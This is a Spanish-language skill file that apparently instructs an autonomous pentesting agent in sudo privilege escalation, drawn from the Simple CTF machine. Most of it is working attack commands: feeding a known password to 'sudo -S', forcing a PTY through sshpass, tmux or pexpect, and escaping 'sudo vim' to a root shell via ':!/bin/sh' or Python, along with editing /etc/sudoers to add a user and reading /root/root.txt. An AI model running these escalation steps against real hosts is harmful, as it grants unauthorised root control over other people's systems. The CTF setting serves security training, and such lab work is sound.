---
name: privesc-sudo
description: Escala privilegios con sudo cuando `sudo -n -l` falla: contraseña por stdin, PTY si el host lo exige y abuso de sudo vim.
---

# Escalada con sudo

Receta para cuando ya tienes una sesión SSH con una credencial **validada** y
`sudo` no responde. Medida en Simple CTF: `nexus.post.ssh_exec` ejecutó
`sudo -n -l` (iteración 21), el comando salió con error y el agente concluyó que
la contraseña SSH era incorrecta. Repitió la misma llamada y murió por timeout
con 20 minutos de presupuesto. La contraseña era correcta: `-n` es lo que
fallaba.

## 1. `-n` no significa «sin contraseña», significa «no preguntes»

```bash
sudo -n -l
# sudo: a password is required
```

`-n`/`--non-interactive` hace que sudo **falle** en vez de pedir la contraseña.
En una cuenta con contraseña eso es siempre un error de sudo, nunca una
credencial inválida: la sesión SSH ya se estableció y el login ya funcionó. No
vuelvas a probar la contraseña de SSH, no relances hydra y no repitas la misma
invocación.

## 2. La forma correcta: `-S` con la contraseña por stdin

`-S` lee la contraseña de la entrada estándar. El ejemplo exacto para `mitch`
(contraseña `secret`, la que ya validó la cadena):

```bash
echo 'secret' | sudo -S -l
```

`sudo -S` imprime el prompt `[sudo] password for mitch:` en stderr y la salida de
`-l` en stdout; el prompt no es un fallo. Si el comando necesita un shell de
root:

```bash
echo 'secret' | sudo -S -s
```

Comprueba el resultado con `id` dentro del mismo comando, no por separado:

```bash
echo 'secret' | sudo -S -s -c 'id; cat /root/root.txt'
```

### Por `nexus.post.ssh_exec` (lo más corto)

Si el comando empieza por `sudo` y **no** lleva `-n`, el handler reescribe la
llamada a `sudo -S …` y le inyecta la credencial del engagement por stdin:

```
nexus.post.ssh_exec(target=<ip>, username="mitch", credential_ref=<handle>,
                    command="sudo -l")
```

Es decir: pide `sudo -l` a secas. Añadir `-n` desactiva la inyección y reproduce
el fallo. `nexus.post.enum_system` hace lo mismo de forma determinista (`sudo -n
-l`, y si falla `sudo -S -l` con la contraseña) y además devuelve las reglas ya
parseadas en `sudo_rules`: úsalo antes de inventar comandos.

### Por `nexus.shell.exec` con PTY

Hay hosts con `Defaults requiretty` en los que sudo exige un terminal. El
`nexus.shell.exec` corre en el Kali del operador, así que el PTY se consigue en
el cliente SSH, no en el objetivo:

```bash
# ssh -t fuerza un PTY en el servidor (y -tt aunque no haya tty local)
sshpass -p 'secret' ssh -tt -o StrictHostKeyChecking=no mitch@<target> \
  "echo 'secret' | sudo -S -l"
```

Si no hay `sshpass`, o el prompt interactivo se come la tubería, usa `tmux`
(queda una sesión viva para leer el prompt y escribir la contraseña):

```bash
tmux new-session -d -s privesc "ssh -tt mitch@<target> 'sudo -l'"
sleep 3
tmux send-keys -t privesc 'secret' Enter
tmux capture-pane -pt privesc
```

o `pexpect`, que es lo mismo pero scriptable y con el patrón del prompt:

```python
import pexpect
child = pexpect.spawn("ssh", ["-tt", "mitch@<target>", "sudo -l"], timeout=30)
child.expect("password for mitch:")
child.sendline("secret")
child.expect(pexpect.EOF)
print(child.before.decode())
```

Regla: el PTY es para que sudo **pregunte**; la contraseña se escribe una vez y
nunca se deja en el argv remoto ni en el historial del objetivo.

## 3. Abusa de las reglas de `sudo -l`

Lee `sudo -l` de arriba abajo. Las reglas del tipo `(root) NOPASSWD: …` no
necesitan contraseña; las que no lo dicen sí (y con `-S` ya sabes dársela).

En Simple CTF la regla era `(root) /usr/bin/vim`. `vim` puede lanzar un shell, y
ese shell hereda el `uid=0`:

```bash
sudo vim -c ':!/bin/sh'
# o, equivalente:
sudo vim -c '!sh'
```

Dentro del shell de root:

```bash
id                 # uid=0(root) gid=0(root)
cat /root/root.txt
```

Variantes útiles cuando `vim` está restringido a un fichero concreto:

```bash
sudo vim -c ':set shell=/bin/sh' -c ':shell'
sudo vim -c ':python3 import os; os.system("/bin/sh")'
sudo vim /etc/sudoers        # si la regla permite editarlo, añade tu usuario
```

El mismo patrón sirve para otros binarios con escape conocido (`less`, `more`,
`man`, `find`, `awk`, `tar`, `nmap --interactive`): cualquier programa que
ejecute un comando externo bajo `sudo` es un shell de root. Si el binario está
restringido, comprueba la versión con `sudo <bin> --version` antes de asumir que
el escape funciona.

## 4. Registra y cierra

- El hecho que cierra la escalada es `privilege` verificado con `uid: 0` (el
  motor lo deriva de un `id` autenticado con salida `uid=0(root)`), no la
  suposición de que `sudo` «debería» funcionar.
- Guarda `root.txt` como `loot` verificado; con `privilege` + `loot` el plan
  marca el objetivo cumplido.
- No repitas un `sudo -n` que ya falló: cambia a `-S`, a `enum_system` o al
  escape de la regla. Un fallo de comando no es un fallo de credencial.
